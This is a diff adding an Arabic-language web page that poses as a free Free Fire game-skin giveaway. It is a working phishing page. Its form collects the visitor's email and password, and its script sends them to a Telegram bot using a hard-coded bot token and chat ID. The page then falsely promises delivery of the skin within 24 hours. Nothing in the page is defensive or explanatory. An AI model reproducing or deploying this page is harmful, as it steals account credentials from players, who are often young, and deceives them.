@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+
+<html lang="ar">
+<head>
+<meta charset="utf-8"/>
+<title>احصل على سكن فري فاير مجانا 🔥</title>
+<style>
+    body {
+      background: #111;
+      color: white;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    .container {
+      margin-top: 100px;
+    }
+    input, select {
+      padding: 10px;
+      margin: 10px;
+      width: 80%;
+      border-radius: 5px;
+      border: none;
+    }
+    button {
+      padding: 12px 30px;
+      background-color: orange;
+      color: black;
+      font-weight: bold;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/><style>
+    body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(to bottom, #121212, #1f1f1f);
+        color: #fff;
+        margin: 0;
+        padding: 20px;
+        text-align: center;
+    }
+    .container {
+        max-width: 400px;
+        margin: auto;
+        padding: 20px;
+        background-color: #2b2b2b;
+        border-radius: 15px;
+        box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+    }
+    input, button {
+        width: 90%;
+        padding: 12px;
+        margin: 10px 0;
+        border: none;
+        border-radius: 10px;
+        font-size: 16px;
+    }
+    input {
+        background-color: #444;
+        color: white;
+    }
+    button {
+        background-color: #00c853;
+        color: white;
+        cursor: pointer;
+    }
+    button:hover {
+        background-color: #00e676;
+    }
+    </style></head>
+<body><div class="container">
+<div class="container">
+<h2>🎁 احصل على سكن نادر الآن 🎮</h2>
+<input id="email" placeholder="أدخل بريدك الإلكتروني" type="text"/><br/>
+<input id="password" placeholder="أدخل كلمة المرور" type="password"/><br/>
+<select id="skin">
+<option>اختر السكن</option>
+<option>سكن MP40 - الذهبي</option>
+<option>سكن M1887 - اللهب</option>
+<option>سكن AK - التنين</option>
+</select><br/>
+<button onclick="sendData()">الحصول على السكن</button>
+</div>
+<script>
+    function sendData() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const skin = document.getElementById("skin").value;
+
+      const message = `🔥 بيانات جديدة 🔥\n\n📧 الإيميل: ${email}\n🔑 كلمة السر: ${password}\n🎮 السكن المطلوب: ${skin}`;
+
+      const token = "7152360609:AAHYab_9ihyuW3ObZ8RjKwFidr-9PWUMKEE";
+      const chatId = "6698080150";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(res => {
+        alert("🚀 تم إرسال الطلب بنجاح! سيتم تسليم السكن في غضون 24 ساعة.");
+      });
+    }
+  </script>
+</div></body>
+</html>
